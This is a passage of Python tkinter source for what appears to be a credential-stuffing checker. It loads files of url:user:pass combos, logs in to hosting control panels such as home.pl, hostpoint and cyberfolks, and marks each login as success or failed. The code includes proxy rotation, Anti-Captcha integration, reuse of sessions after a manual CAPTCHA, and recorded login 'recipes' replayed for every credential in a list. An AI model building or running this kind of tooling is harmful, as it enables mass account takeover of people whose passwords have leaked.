            self._statusbar.config(text=f"Domain login URL mappings saved — {len(parsed)} mapping(s)")
            dlg.destroy()

        def _clear():
            mapping_text.delete("1.0", "end")
            _update_count()

        ttk.Button(btns, text="Apply & Close", command=_apply).pack(side="right", padx=(4, 0))
        ttk.Button(btns, text="Clear", command=_clear).pack(side="right", padx=(4, 0))
        ttk.Button(btns, text="Cancel", command=dlg.destroy).pack(side="right")

    def _build_table(self):
        C     = self._palette
        frame = ttk.Frame(self._checker_tab)
        frame.pack(fill="both", expand=True, padx=0, pady=(4, 0))

        cols   = ("#", "Domain", "URL", "Username", "Password", "Status", "Note", "📷")
        # Proportional weights for responsive column sizing (must sum to 1.0)
        self._tree_col_weights = {
            "#": 0.04, "Domain": 0.13, "URL": 0.22,
            "Username": 0.13, "Password": 0.11, "Status": 0.14, "Note": 0.15, "📷": 0.08,
        }
        self._tree_col_minwidths = {
            "#": 40, "Domain": 80, "URL": 100, "Username": 80,
            "Password": 80, "Status": 80, "Note": 60, "📷": 50,
        }

        self._tree = ttk.Treeview(frame, columns=cols,
                                  show="headings", selectmode="extended")
        for col in cols:
            self._tree.heading(col, text=col)
            self._tree.column(col, width=120, minwidth=self._tree_col_minwidths[col])

        # Resize columns proportionally whenever the table frame is resized
        frame.bind("<Configure>", self._on_table_resize)

        sb_y = ttk.Scrollbar(frame, orient="vertical",   command=self._tree.yview)
        sb_x = ttk.Scrollbar(frame, orient="horizontal", command=self._tree.xview)
        self._tree.configure(yscrollcommand=sb_y.set, xscrollcommand=sb_x.set)
        self._tree.grid(row=0, column=0, sticky="nsew")
        sb_y.grid(row=0, column=1, sticky="ns")
        sb_x.grid(row=1, column=0, sticky="ew")
        frame.rowconfigure(0, weight=1)
        frame.columnconfigure(0, weight=1)

        self._tree.tag_configure("success", foreground=C["green"])
        self._tree.tag_configure("failed",  foreground=C["red"])
        self._tree.tag_configure("unknown", foreground=C["yellow"])
        self._tree.tag_configure("odd",     background=C["row_odd"])
        self._tree.tag_configure("even",    background=C["row_even"])

        # Right-click context menu
        self._ctx_menu = tk.Menu(self, tearoff=0,
                                 bg=C["surface"], fg=C["fg"],
                                 activebackground=C["accent"],
                                 activeforeground=C["bg"],
                                 font=("Segoe UI", 10))
        self._ctx_menu.add_command(label="Copy URL",             command=lambda: self._copy_col(2))
        self._ctx_menu.add_command(label="Copy Username",        command=lambda: self._copy_col(3))
        self._ctx_menu.add_command(label="Copy Password",        command=lambda: self._copy_col(4))
        self._ctx_menu.add_separator()
        self._ctx_menu.add_command(label="Copy Row (url:user:pass)", command=self._copy_row)
        self._ctx_menu.add_separator()
        self._ctx_menu.add_command(label="📷 View Screenshot",
                                   command=self._ctx_view_screenshot)

        self._tree.bind("<Button-3>",  self._show_ctx_menu)
        self._tree.bind("<Control-c>", lambda e: self._copy_row())
        self._tree.bind("<Double-1>", self._on_tree_double_click)
        self._tree.bind("<Button-1>",  self._on_tree_click)

    def _on_tree_double_click(self, event):
        """Handle double-click on Note column for inline editing."""
        region = self._tree.identify_region(event.x, event.y)
        if region != "cell":
            return
        column = self._tree.identify_column(event.x)
        if column != "#7":  # Note is column 7
            return
        item = self._tree.identify_row(event.y)
        if not item:
            return
        abs_idx = int(item)
        current_note = self._notes.get(abs_idx, "")
        bbox = self._tree.bbox(item, column)
        if not bbox:
            return
        x, y, w, h = bbox
        entry = tk.Entry(self._tree, width=20)
        entry.insert(0, current_note)
        entry.place(x=x, y=y, width=w, height=h)
        entry.focus()
        def save_note():
            new_note = entry.get()
            self._notes[abs_idx] = new_note
            values = list(self._tree.item(item, "values"))
            values[6] = new_note
            self._tree.item(item, values=values)
            entry.destroy()
        entry.bind("<Return>", lambda e: save_note())
        entry.bind("<FocusOut>", lambda e: save_note())

    def _on_table_resize(self, event):
        """Distribute available treeview width across columns proportionally."""
        # Subtract scrollbar width (~16 px) so columns don't force a scrollbar
        available = event.width - 18
        if available < 100:
            return
        for col, weight in self._tree_col_weights.items():
            w = max(self._tree_col_minwidths[col], int(available * weight))
            self._tree.column(col, width=w)

    def _build_pager(self):
        C    = self._palette
        pbar = ttk.Frame(self._checker_tab)
        pbar.pack(fill="x", padx=0, pady=(2, 4))

        self._btn_prev = ttk.Button(pbar, text="<< Prev",
                                    command=self._prev_page, state="disabled")
        self._btn_next = ttk.Button(pbar, text="Next >>",
                                    command=self._next_page, state="disabled")
        self._page_var = tk.StringVar(value="")

        self._btn_prev.pack(side="left")
        ttk.Label(pbar, textvariable=self._page_var,
                  foreground=C["accent"]).pack(side="left", padx=10)
        self._btn_next.pack(side="left")

        ttk.Label(pbar, text="  Go to page:").pack(side="left", padx=(20, 2))
        self._goto_var = tk.StringVar()
        e = ttk.Entry(pbar, textvariable=self._goto_var, width=7)
        e.pack(side="left")
        e.bind("<Return>", lambda _: self._goto_page())
        ttk.Button(pbar, text="Go", command=self._goto_page).pack(side="left", padx=4)

    def _build_status_bar(self):
        C = self._palette
        self._statusbar = tk.Label(
            self,
            text="Ready — open a credential file to begin.",
            bg=C["heading"], fg=C["fg"],
            anchor="w", padx=8,
            font=("Segoe UI", 9),
        )
        self._statusbar.pack(fill="x", side="bottom")

    # ================================================================
    # Proxy dialog + helpers
    # ================================================================

    def _refresh_proxy_display(self):
        """Update the proxy indicator on the main window."""
        mgr = self._proxy_mgr
        if mgr.enabled and mgr.proxy_count > 0:
            display = mgr.current_proxy_display()
            self._proxy_display_var.set(display)
            self._proxy_display_lbl.config(foreground=self._palette["green"])
            self._proxy_status_var.set(
                f"({mgr.proxy_count} proxies, rotate every {mgr.rotate_every})")
        else:
            self._proxy_display_var.set("No proxy")
            self._proxy_display_lbl.config(foreground=self._palette["yellow"])
            self._proxy_status_var.set("")

    # ── DOM settings persistence ──────────────────────────────────────────

    def _load_dom_settings(self):
        """Load DOM field HTML snippets from dom_settings.json (if it exists)."""
        try:
            if _DOM_SETTINGS_FILE.exists():
                data = json.loads(_DOM_SETTINGS_FILE.read_text(encoding="utf-8"))
                self._dom_cookie_var.set(data.get("cookie", ""))
                self._dom_user_var.set(  data.get("user",   ""))
                self._dom_pass_var.set(  data.get("pass",   ""))
                self._dom_submit_var.set(data.get("submit", ""))
                self._dom_logout_var.set(data.get("logout", ""))
                self._dom_login_trigger_var.set(data.get("login_trigger", ""))
                self._dom_login_tab_var.set(data.get("login_tab", ""))
        except Exception:
            pass  # silently ignore corrupt / missing file

    def _save_dom_settings(self):
        """Persist current DOM field HTML snippets to dom_settings.json."""
        try:
            data = {
                "cookie": self._dom_cookie_var.get(),
                "user":   self._dom_user_var.get(),
                "pass":   self._dom_pass_var.get(),
                "submit": self._dom_submit_var.get(),
                "logout": self._dom_logout_var.get(),
                "login_trigger": self._dom_login_trigger_var.get(),
                "login_tab": self._dom_login_tab_var.get(),
            }
            _DOM_SETTINGS_FILE.write_text(
                json.dumps(data, ensure_ascii=False, indent=2),
                encoding="utf-8",
            )
        except Exception:
            pass

    def _resolve_dom_settings_for_entry(self, entry: dict) -> dict[str, str]:
        """Resolve DOM settings for an entry (global settings only)."""
        _ = entry
        return {
            "cookie": self._dom_cookie_var.get().strip(),
            "user": self._dom_user_var.get().strip(),
            "pass": self._dom_pass_var.get().strip(),
            "submit": self._dom_submit_var.get().strip(),
            "logout": self._dom_logout_var.get().strip(),
            "login_trigger": self._dom_login_trigger_var.get().strip(),
            "login_tab": self._dom_login_tab_var.get().strip(),
        }

    # ── Anti-Captcha settings ──────────────────────────────────────────────

    def _load_anticaptcha_settings(self):
        """Load Anti-Captcha key from anti_captcha_settings.json."""
        try:
            if _ANTI_CAPTCHA_SETTINGS_FILE.exists():
                data = json.loads(_ANTI_CAPTCHA_SETTINGS_FILE.read_text(encoding="utf-8"))
                self._anticaptcha_api_key_var.set(str(data.get("api_key", "")))
                self._use_anticaptcha_var.set(bool(data.get("enabled", False)))
        except Exception:
            pass

    def _save_anticaptcha_settings(self):
        """Persist Anti-Captcha key to anti_captcha_settings.json."""
        try:
            data = {
                "api_key": self._anticaptcha_api_key_var.get().strip(),
                "enabled": bool(self._use_anticaptcha_var.get()),
            }
            _ANTI_CAPTCHA_SETTINGS_FILE.write_text(
                json.dumps(data, ensure_ascii=False, indent=2),
                encoding="utf-8",
            )
        except Exception:
            pass

    def _open_proxy_dialog(self):
        """Open the proxy settings dialog."""
        C = self._palette
        mgr = self._proxy_mgr

        dlg = tk.Toplevel(self)
        dlg.title("Proxy Settings")
        dlg.geometry("560x520")
        dlg.configure(bg=C["bg"])
        dlg.transient(self)
        dlg.grab_set()

        # ── Enable toggle ─────────────────────────────────────────────
        top = ttk.Frame(dlg)
        top.pack(fill="x", padx=12, pady=(12, 4))

        enabled_var = tk.BooleanVar(value=mgr.enabled)
        ttk.Checkbutton(top, text="Enable Proxy Rotation",
                        variable=enabled_var).pack(side="left")

        # ── Rotate every N ────────────────────────────────────────────
        rotate_frame = ttk.Frame(dlg)
        rotate_frame.pack(fill="x", padx=12, pady=(4, 4))

        ttk.Label(rotate_frame, text="Rotate every:").pack(side="left")
        rotate_var = tk.IntVar(value=mgr.rotate_every)
        ttk.Spinbox(rotate_frame, from_=1, to=9999, width=6,
                    textvariable=rotate_var).pack(side="left", padx=(4, 4))
        ttk.Label(rotate_frame, text="request(s)",
                  foreground=C["muted"]).pack(side="left")

        # ── Proxy list text area ──────────────────────────────────────
        lbl_frame = ttk.Frame(dlg)
        lbl_frame.pack(fill="x", padx=12, pady=(8, 2))
        ttk.Label(
            lbl_frame,
            text=("Proxy List (one per line: ip:port:user:pass OR CSV row "
                  "with ip/port/protocols)"),
                  font=("Segoe UI", 10, "bold")).pack(side="left")

        text_frame = ttk.Frame(dlg)
        text_frame.pack(fill="both", expand=True, padx=12, pady=(0, 4))

        proxy_text = tk.Text(
            text_frame,
            bg=C["surface"], fg=C["fg"],
            insertbackground=C["fg"],
            font=("Consolas", 10),
            wrap="none",
            relief="flat",
            borderwidth=2,
        )
        proxy_sb = ttk.Scrollbar(text_frame, orient="vertical",
                                 command=proxy_text.yview)
        proxy_text.configure(yscrollcommand=proxy_sb.set)
        proxy_text.pack(side="left", fill="both", expand=True)
        proxy_sb.pack(side="right", fill="y")

        # Pre-fill with current proxies
        current_proxies = mgr.proxies
        if current_proxies:
            proxy_text.insert("1.0", "\n".join(current_proxies))

        # ── Count label ───────────────────────────────────────────────
        count_var = tk.StringVar(value=f"{len(current_proxies)} proxies loaded")
        count_lbl = ttk.Label(dlg, textvariable=count_var,
                              foreground=C["accent"])
        count_lbl.pack(padx=12, anchor="w")

        def _update_count(*_):
            raw = proxy_text.get("1.0", "end").strip()
            lines = [l.strip() for l in raw.splitlines() if l.strip()]
            count_var.set(f"{len(lines)} proxies loaded")

        proxy_text.bind("<KeyRelease>", _update_count)

        # ── Buttons ───────────────────────────────────────────────────
        btn_frame = ttk.Frame(dlg)
        btn_frame.pack(fill="x", padx=12, pady=(4, 12))

        def _apply():
            raw = proxy_text.get("1.0", "end").strip()
            lines = [l.strip() for l in raw.splitlines() if l.strip()]
            enabled = enabled_var.get()
            mgr.set_proxies(lines)
            mgr.set_rotate_every(rotate_var.get())
            mgr.set_enabled(enabled and bool(lines))
            mgr.reset_rotation()
            self._refresh_proxy_display()
            self._statusbar.config(
                text=f"Proxy settings saved — {len(lines)} proxies, "
                     f"rotate every {rotate_var.get()} (no retest)"
            )
            dlg.destroy()

        def _clear_proxies():
            proxy_text.delete("1.0", "end")
            _update_count()

        ttk.Button(btn_frame, text="Apply & Close",
                   command=_apply).pack(side="right", padx=(4, 0))
        ttk.Button(btn_frame, text="Clear All",
                   command=_clear_proxies).pack(side="right", padx=(4, 0))
        ttk.Button(btn_frame, text="Cancel",
                   command=dlg.destroy).pack(side="right")

    def _open_dom_settings_dialog(self):
        """Modal for pasting HTML element snippets for each login form field.

        User pastes a raw HTML tag (e.g. <button class="loginBtn">Login</button>)
        and the dialog converts it to a CSS selector live.  On Save the selectors
        are stored in the StringVar instances and passed to every checker call.
        """
        C = self._palette

        dlg = tk.Toplevel(self)
        dlg.title("DOM Field Settings")
        dlg.geometry("600x560")
        dlg.configure(bg=C["bg"])
        dlg.transient(self)
        dlg.grab_set()

        # ── Import converter so we can preview live ───────────────────────
        try:
            from src.checker import _html_to_css_selector as _h2css
        except ImportError:
            try:
                from checker import _html_to_css_selector as _h2css
            except ImportError:
                _h2css = None

        # ── Instructions ──────────────────────────────────────────────────
        hdr = ttk.Frame(dlg)
        hdr.pack(fill="x", padx=14, pady=(12, 6))
        ttk.Label(
            hdr,
            text="Paste the full HTML element for each login field.\n"
                 "The app will find it first on the page (overrides auto-detection).\n"
                 "Leave blank to use default auto-detection.",
            foreground=C["muted"],
            justify="left",
        ).pack(anchor="w")

        # ── Helper: build one row ─────────────────────────────────────────
        def _make_row(parent, label_text: str, string_var: tk.StringVar):
            row = ttk.Frame(parent)
            row.pack(fill="x", padx=14, pady=(8, 0))

            ttk.Label(row, text=label_text,
                      font=("Segoe UI", 10, "bold")).pack(anchor="w")

            txt = tk.Text(
                row,
                height=2,
                bg=C["surface"], fg=C["fg"],
                insertbackground=C["fg"],
                font=("Consolas", 9),
                wrap="none",
                relief="flat",
                borderwidth=2,
            )
            txt.pack(fill="x")
            if string_var.get():
                txt.insert("1.0", string_var.get())

            preview_var = tk.StringVar(value="")
            preview_lbl = ttk.Label(row, textvariable=preview_var,
                                    foreground=C["accent"],
                                    font=("Consolas", 9))
            preview_lbl.pack(anchor="w", pady=(2, 0))

            def _update_preview(*_):
                raw = txt.get("1.0", "end").strip()
                if not raw:
                    preview_var.set("")
                    return
                if _h2css:
                    sel = _h2css(raw)
                    preview_var.set(f"→  {sel}" if sel else "⚠  Could not parse — check HTML snippet")
                else:
                    preview_var.set("(preview unavailable)")

            txt.bind("<KeyRelease>", _update_preview)
            _update_preview()

            return txt

        # ── Field rows ───────────────────────────────────────────────────
        body = ttk.Frame(dlg)
        body.pack(fill="both", expand=True)

        _txt_cookie = _make_row(body, "Cookie / consent close button:", self._dom_cookie_var)
        _txt_login_trigger = _make_row(body, "Login modal trigger button/link (optional):", self._dom_login_trigger_var)
        _txt_login_tab = _make_row(body, "Login tab inside modal (optional):", self._dom_login_tab_var)
        _txt_user   = _make_row(body, "Username / Email field:",        self._dom_user_var)
        _txt_pass   = _make_row(body, "Password field:",                self._dom_pass_var)
        _txt_submit = _make_row(body, "Login / Submit button:",         self._dom_submit_var)
        _txt_logout = _make_row(body, "Logout button (optional):",      self._dom_logout_var)

        # ── Buttons ───────────────────────────────────────────────────────
        btn_frame = ttk.Frame(dlg)
        btn_frame.pack(fill="x", padx=14, pady=(8, 14))

        def _save():
            self._dom_cookie_var.set(_txt_cookie.get("1.0", "end").strip())
            self._dom_login_trigger_var.set(_txt_login_trigger.get("1.0", "end").strip())
            self._dom_login_tab_var.set(_txt_login_tab.get("1.0", "end").strip())
            self._dom_user_var.set(  _txt_user.get("1.0",   "end").strip())
            self._dom_pass_var.set(  _txt_pass.get("1.0",   "end").strip())
            self._dom_submit_var.set(_txt_submit.get("1.0", "end").strip())
            self._dom_logout_var.set(_txt_logout.get("1.0", "end").strip())
            self._save_dom_settings()
            self._statusbar.config(text="DOM field settings saved.")
            dlg.destroy()

        def _clear_all():
            for t in (
                _txt_login_trigger, _txt_login_tab,
                _txt_user, _txt_pass, _txt_submit, _txt_logout
            ):
                t.delete("1.0", "end")
                t.event_generate("<KeyRelease>")  # refresh previews

        ttk.Button(btn_frame, text="Save & Close",
                   command=_save).pack(side="right", padx=(4, 0))
        ttk.Button(btn_frame, text="Clear All",
                   command=_clear_all).pack(side="right", padx=(4, 0))
        ttk.Button(btn_frame, text="Cancel",
                   command=dlg.destroy).pack(side="right")

    # ================================================================
    # CAPTCHA & Session helpers
    # ================================================================

    def _update_session_label(self):
        if not hasattr(self, "_session_var"):
            return
        if load_session_exists():
            self._session_var.set("Session: ACTIVE (state.json)")
        else:
            self._session_var.set("Session: none")

    def _clear_session_ui(self):
        clear_session()
        self._update_session_label()
        self._statusbar.config(text="Session cleared. Next check will start fresh.")

    def _run_captcha_entry(self):
        """
        Open a visible browser for the selected (or first) row so the user
        can manually solve the CAPTCHA. The session is saved automatically
        after a successful login and reused for all subsequent headless checks.
        """
        # Prefer the selected row, else first row of current page
        sel = self._tree.selection()
        if sel:
            abs_idx = int(sel[0])
        else:
            if not self._page_rows:
                messagebox.showinfo("No rows", "Load a file first.")
                return
            abs_idx = self._page_rows[0].get("_abs_idx", 0)

        # Stream just that one row from disk
        entry = self._get_entry_by_abs_idx(abs_idx)
        if entry is None:
            messagebox.showerror("Error", "Could not load that entry.")
            return

        self._statusbar.config(
            text=f"Opening visible browser for {entry['domain']} — solve CAPTCHA then close.")
        self.update_idletasks()

        def _worker():
            custom_login_url = self._resolve_login_url_for_entry(
                entry,
                default_login_url=self._login_url_var.get().strip(),
            )
            result = try_login_manual_captcha(
                entry,
                custom_login_url=custom_login_url,
            )
            self._results[abs_idx] = result
            self.after(0, lambda r=result: self._on_captcha_done(abs_idx, r))

        threading.Thread(target=_worker, daemon=True).start()

    def _on_captcha_done(self, abs_idx: int, result: str):
        self._update_session_label()
        self._statusbar.config(
            text=f"CAPTCHA session result: {result}  — session saved to state.json")
        # Refresh current page so status is visible
        self._load_page(self._page_index)

    # ================================================================
    # Record & Replay helpers
    # ================================================================

    def _update_recipe_label(self):
        if not hasattr(self, "_recipe_var"):
            return
        if recipe_exists():
            self._recipe_var.set(f"Recipe: ACTIVE ({RECIPE_FILE.name})")
        else:
            self._recipe_var.set("Recipe: none")

    def _clear_recipe_ui(self):
        clear_recipe()
        self._update_recipe_label()
        self._statusbar.config(text="Recipe cleared.")

    def _record_login(self):
        """
        Open a visible Chrome window, inject the action recorder, let the user
        perform their full login sequence, then save the recipe to
        login_recipe.json.  Subsequent 'Check All' will use the recipe
        (try_login_recorded) instead of the generic login logic.
        """
        # Determine the URL to open — prefer selected row, else ask the user
        url = ""
        sel = self._tree.selection()
        if sel:
            abs_idx = int(sel[0])
            entry = self._get_entry_by_abs_idx(abs_idx)
            if entry:
                # Route to known portals
                from src.checker import (
                    SUPERHOSTING_LOGIN_URL, ZETTAHOST_LOGIN_URL, NS1_LOGIN_URL,
                    HOSTPOINT_LOGIN_URL, HOME_PL_LOGIN_URL, CYBERFOLKS_LOGIN_URL,
                )
                domain = entry.get("domain", "").lower()
                raw_url = entry.get("url", "")
                if "superhosting" in domain or "superhosting" in raw_url.lower():
                    url = SUPERHOSTING_LOGIN_URL
                elif "zettahost" in domain or "zettahost" in raw_url.lower():
                    url = ZETTAHOST_LOGIN_URL
                elif "ns1.bg" in domain or "ns1.bg" in raw_url.lower():
                    url = NS1_LOGIN_URL
                elif "hostpoint" in domain or "hostpoint" in raw_url.lower():
                    url = HOSTPOINT_LOGIN_URL
                elif "home.pl" in domain or "panel.home.pl" in raw_url.lower():
                    url = HOME_PL_LOGIN_URL
                elif "cyberfolks" in domain or "cyberfolks" in raw_url.lower():
                    url = CYBERFOLKS_LOGIN_URL
                else:
                    url = raw_url

        if not url:
            from tkinter.simpledialog import askstring
            url = askstring(
                "Record Login",
                "Enter the login page URL to record:",
                parent=self,
            )
            if not url:
                return
            if not url.startswith("http"):
                url = "https://" + url

        # Ask for credentials used during recording so they can be
        # replaced with sentinels in the saved recipe
        from tkinter.simpledialog import askstring
        uname = askstring(
            "Record Login",
            "Enter the USERNAME you will type during recording\n"
            "(so it gets replaced with a placeholder in the recipe):",
            parent=self,
        ) or ""
        pword = askstring(
            "Record Login",
            "Enter the PASSWORD you will type during recording\n"
            "(so it gets replaced with a placeholder in the recipe):",
            parent=self,
        ) or ""

        self._statusbar.config(
            text=f"⏺ Recording — Chrome will open at {url}. "
                  "Perform your full login, then CLOSE the browser window.")
        self.update_idletasks()
        if hasattr(self, "_btn_record"):
            self._btn_record.config(state="disabled")

        def _status_cb(msg: str):
            self.after(0, lambda m=msg: self._statusbar.config(text=m))

        def _worker():
            result = record_login_actions(
                url=url,
                username_hint=uname,
                password_hint=pword,
                on_status=_status_cb,
            )
            self.after(0, lambda r=result: self._on_record_done(r))

        threading.Thread(target=_worker, daemon=True).start()

    def _on_record_done(self, result: str):
        if hasattr(self, "_btn_record"):
            self._btn_record.config(state="normal")
        self._update_recipe_label()
        self._update_session_label()
        self._statusbar.config(text=f"Recording done: {result}")
        if recipe_exists():
            messagebox.showinfo(
                "Recipe Saved",
                f"{result}\n\n"
                "The recipe is now active.\n"
                "'Check All' will use it to replay your login actions "
                "for every credential in the list.",
                parent=self,
            )

    # ================================================================
    # Manual credential adder
    # ================================================================

    def _add_credential_dialog(self):
        """
        Open a small dialog where the user can type one or more credentials
        (URL, username, password) that are NOT in the loaded file.
        Each entry is added to self._manual_entries, shown at the TOP of the
        table with a negative abs_idx so it never collides with file rows,
        and is included in the next 'Check All' run.
        """
        C   = self._palette
        win = tk.Toplevel(self)
        win.title("Add Credentials")
        win.geometry("540x480")
        win.minsize(420, 360)
        win.configure(bg=C["bg"])
        win.grab_set()  # modal

        ttk.Label(win,
            text="Add credentials to check (not in the file).",
            foreground=C["accent"],
            font=("Segoe UI", 10, "bold"),
        ).pack(padx=12, pady=(12, 6), anchor="w")

        form = ttk.Frame(win)
        form.pack(fill="x", padx=12, pady=4)

        fields = [("Login URL:", 50), ("Username:", 40), ("Password:", 40)]
        entries: list[ttk.Entry] = []
        for label_txt, w in fields:
            row = ttk.Frame(form)
            row.pack(fill="x", pady=3)
            ttk.Label(row, text=label_txt, width=12, anchor="e").pack(side="left", padx=(0, 6))
            ent = ttk.Entry(row, width=w)
            ent.pack(side="left", fill="x", expand=True)
            entries.append(ent)
        url_ent, user_ent, pass_ent = entries
        url_ent.insert(0, self._login_url_var.get() or "https://")

        # ---- Added entries list ----
        ttk.Label(win, text="Credentials queued:",
                  foreground=C["muted"]).pack(anchor="w", padx=12, pady=(10, 2))

        list_frame = ttk.Frame(win)
        list_frame.pack(fill="both", expand=True, padx=12, pady=(0, 4))

        lb = tk.Listbox(list_frame,
                        bg=C["surface"], fg=C["fg"],
                        selectbackground=C["accent"], selectforeground=C["bg"],
                        font=("Consolas", 9), activestyle="none", bd=0,
                        highlightthickness=0)
        sb = ttk.Scrollbar(list_frame, orient="vertical", command=lb.yview)
        lb.configure(yscrollcommand=sb.set)
        lb.pack(side="left", fill="both", expand=True)
        sb.pack(side="right", fill="y")

        # Pre-populate with already-queued manual entries
        for me in self._manual_entries:
            lb.insert("end",
                f"{me['url']}  |  {me['username']}  |  {me['password']}")

        def _add_one():
            url  = url_ent.get().strip()
            user = user_ent.get().strip()
            pwd  = pass_ent.get().strip()
            if not url or not user or not pwd:
                messagebox.showwarning("Missing fields",
                    "Please fill in URL, Username and Password.", parent=win)
                return
            if not url.startswith("http"):
                url = "https://" + url

            from urllib.parse import urlparse
            domain = urlparse(url).netloc or url

            # Use a unique negative index
            neg_idx = -(len(self._manual_entries) + 1)
            entry = {
                "url":      url,
                "username": user,
                "password": pwd,
                "domain":   domain,
                "status":   "Pending",
                "_abs_idx": neg_idx,
            }
            self._manual_entries.append(entry)
            self._results[neg_idx] = "Pending"

            lb.insert("end", f"{url}  |  {user}  |  {pwd}")
            # Clear input fields for the next entry
            user_ent.delete(0, "end")
            pass_ent.delete(0, "end")
            user_ent.focus_set()

            # Insert row into the tree immediately (at top)
            tag_alt = "odd" if neg_idx % 2 else "even"
            iid     = str(neg_idx)
            if not self._tree.exists(iid):
                self._tree.insert(
                    "", 0,
                    iid=iid,
                    values=(f"M{-neg_idx}", domain, url, user, pwd, "Pending"),
                    tags=(tag_alt, "unknown"),
                )
            # Enable Check All if not already enabled
            self._btn_check.config(state="normal")
            self._btn_clear.config(state="normal")
            if self._total_lines == 0:
                self._total_lines = 0  # keep 0 so pager doesn't break

        def _remove_selected():
            sel = lb.curselection()
            if not sel:
                return
            idx_in_list = sel[0]
            if idx_in_list >= len(self._manual_entries):
                return
            me = self._manual_entries.pop(idx_in_list)
            neg_idx = me["_abs_idx"]
            self._results.pop(neg_idx, None)
            lb.delete(idx_in_list)
            iid = str(neg_idx)
            if self._tree.exists(iid):
                self._tree.delete(iid)

        btn_row = ttk.Frame(win)
        btn_row.pack(fill="x", padx=12, pady=(4, 12))
        ttk.Button(btn_row, text="Add",    command=_add_one).pack(side="left", padx=4)
        ttk.Button(btn_row, text="Remove Selected",
                   command=_remove_selected).pack(side="left", padx=4)
        ttk.Button(btn_row, text="Close",  command=win.destroy).pack(side="right", padx=4)

        url_ent.focus_set()
        url_ent.bind("<Return>", lambda _: user_ent.focus_set())
        user_ent.bind("<Return>", lambda _: pass_ent.focus_set())
        pass_ent.bind("<Return>", lambda _: _add_one())

    def _get_entry_by_abs_idx(self, abs_idx: int) -> dict | None:
        """Stream the file and return the focus-filtered entry at abs_idx."""
        if self._filepath is None:
            return None
        valid_idx = 0
        with open(self._filepath, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                entry = parse_credential_line(line)
                if entry is None or not self._line_passes_focus(entry):
                    continue
                if valid_idx == abs_idx:
                    entry["_abs_idx"] = abs_idx
                    return entry
                valid_idx += 1
        return None

    # ================================================================
    # File loading — streaming, never loads all rows into RAM
    # ================================================================

    def _open_file(self):
        path = filedialog.askopenfilename(
            title="Select credential file",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")],
        )
        if not path:
            return

        self._filepath       = path
        self._results.clear()
        self._line_index     = []
        self._search_results = None
        self._search_page    = 0
        self._page_index     = 0
        self._cnt_ok = self._cnt_fail = self._cnt_unknown = 0
        self._invalidate_filter_cache()
        self._invalidate_grouped_main_cache()

        self._statusbar.config(text="Counting lines... (this may take a moment for large files)")
        self._btn_check.config(state="disabled")
        self.update_idletasks()

        dedup_enabled = self._dedup_on_load_var.get()
        save_removed_list = self._save_removed_list_var.get()
        threading.Thread(
            target=self._count_worker,
            args=(path, dedup_enabled, save_removed_list),
            daemon=True,
        ).start()

    # ================================================================
    # Domain focus helpers
    # ================================================================

    def _get_focus(self) -> str:
        return self._domain_var.get().strip().lower()

    def _line_passes_focus(self, entry: dict) -> bool:
        focus = self._get_focus()
        if not focus:
            return True
        return focus in entry["domain"].lower() or focus in entry["url"].lower()

    def _line_passes_all_filters(self, entry: dict, status: str = "") -> bool:
        """Returns True only if entry passes EVERY active filter (domain, URL, email, status)."""
        if not self._line_passes_focus(entry):
            return False
        url_kw = self._url_keyword_var.get().strip().lower()
        username_mode = self._username_filter_var.get()
        if url_kw and url_kw not in entry["url"].lower():
            return False
        if not self._username_matches_filter(entry["username"], username_mode):
            return False
        # Status filter
        status_f = self._status_filter.get()
        if status_f and status_f != "All" and status:
            sl = status.lower()
            sf = status_f.lower()
            if sf == "success" and "success" not in sl:
                return False
            elif sf == "failed" and "failed" not in sl:
                return False
            elif sf not in ("success", "failed") and sf not in sl:
                return False
        return True

    @staticmethod
    def _status_matches_filter(status: str, status_filter: str) -> bool:
        """Fast status-filter matcher used in big loops (search/dump/check prep)."""
        if not status_filter or status_filter == "All":
            return True
        sl = status.lower()
        sf = status_filter.lower()
        if sf == "success":
            return "success" in sl
        if sf == "failed":
            return "failed" in sl
        return sf in sl

    @staticmethod
    def _username_matches_filter(username: str, mode: str) -> bool:
        has_at = "@" in (username or "")
        if mode == "Email Only":
            return has_at
        if mode == "ID Only":
            return not has_at
        return True

    def _invalidate_grouped_main_cache(self):
        self._grouped_main_index_cache = None
        self._grouped_main_index_cache_key = None

    def _group_abs_indices_by_domain(
        self,
        abs_indices: list[int],
        filepath: str,
        index_snap: list[int],
    ) -> list[int]:
        """Group abs_idx list by domain while preserving stable in-group order."""
        if not abs_indices:
            return []

        grouped: dict[str, list[int]] = {}
        domain_order: list[str] = []

        with open(filepath, "rb") as fb:
            for abs_idx in abs_indices:
                if abs_idx < 0 or abs_idx >= len(index_snap):
                    continue
                fb.seek(index_snap[abs_idx])
                raw = fb.readline()
                entry = parse_credential_line(raw.decode("utf-8", errors="ignore"))
                domain = (entry.get("domain", "").lower() if entry else "")
                if domain not in grouped:
                    grouped[domain] = []
                    domain_order.append(domain)
                grouped[domain].append(abs_idx)

        ordered: list[int] = []
        for domain in domain_order:
            ordered.extend(grouped[domain])
        return ordered

    def _group_entries_by_domain_stable(self, entries: list[dict]) -> list[dict]:
        """Group entries by domain with stable first-seen group order."""
        if not entries:
            return []
        grouped: dict[str, list[dict]] = {}
        order: list[str] = []
        for entry in entries:
            domain = (entry.get("domain", "") or "").lower()
            if domain not in grouped:
                grouped[domain] = []
                order.append(domain)
            grouped[domain].append(entry)
        ordered: list[dict] = []
        for domain in order:
            ordered.extend(grouped[domain])
        return ordered

    def _main_abs_index_order(self) -> list[int]:
        """Return absolute-index order for main table (grouped or default)."""
        if not self._group_by_domain_var.get():
            return list(range(len(self._line_index)))
        if not self._filepath or not self._line_index:
            return []

        key = (self._filepath, len(self._line_index))
        if self._grouped_main_index_cache is not None and self._grouped_main_index_cache_key == key:
            return list(self._grouped_main_index_cache)

        ordered = self._group_abs_indices_by_domain(
            abs_indices=list(range(len(self._line_index))),
            filepath=self._filepath,
            index_snap=list(self._line_index),
        )
        self._grouped_main_index_cache = ordered
        self._grouped_main_index_cache_key = key
        return list(ordered)

    def _on_group_domain_toggle(self):
        self._invalidate_grouped_main_cache()
        if self._search_results is not None:
            if self._group_by_domain_var.get():
                self._search_results = self._group_entries_by_domain_stable(self._search_results)
                self._search_page = 0
                self._display_search_page()
            else:
                # Re-run active search to restore original (non-grouped) order.
                self._do_search()
            return
        if self._filepath:
            self._load_page(self._page_index)

    # ================================================================
    # Filter-result cache helpers
    # ================================================================

    def _get_filter_key(self) -> tuple:
        """Return a hashable snapshot of the current filter state (excluding status).
        Status filter is NOT cached because it can change without a rebuild;
